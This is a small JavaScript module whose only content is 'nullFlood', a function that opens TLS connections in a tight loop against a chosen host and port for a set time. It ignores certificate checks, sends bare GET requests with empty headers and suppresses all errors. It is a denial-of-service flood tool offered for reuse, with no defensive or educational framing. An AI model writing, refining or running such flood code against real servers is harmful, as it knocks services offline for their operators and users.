const net = require('net');
const tls = require('tls');

function nullFlood(host, port, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    const socket = tls.connect({host, port, servername: host, rejectUnauthorized: false}, ()=>{
      socket.write(`GET / HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: \r\nReferer: \r\nAccept: \r\n\r\n`);
      socket.end();
    });
    socket.on('error',()=>{});
  }
}
module.exports = { nullFlood };